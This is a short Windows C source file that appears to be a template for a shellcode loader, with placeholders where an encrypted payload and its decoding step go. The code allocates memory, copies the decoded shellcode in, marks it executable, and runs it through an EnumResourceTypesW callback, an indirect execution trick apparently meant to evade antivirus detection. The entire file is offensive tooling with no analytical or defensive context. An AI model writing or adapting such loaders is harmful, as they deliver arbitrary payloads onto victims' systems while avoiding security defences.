#include <windows.h>
#include "base64.h"
#include "syscall.h"


char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	::RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	::EnumResourceTypesW(::LoadLibraryW(L"Kernel32.dll"), (ENUMRESTYPEPROCW)addr, NULL);

}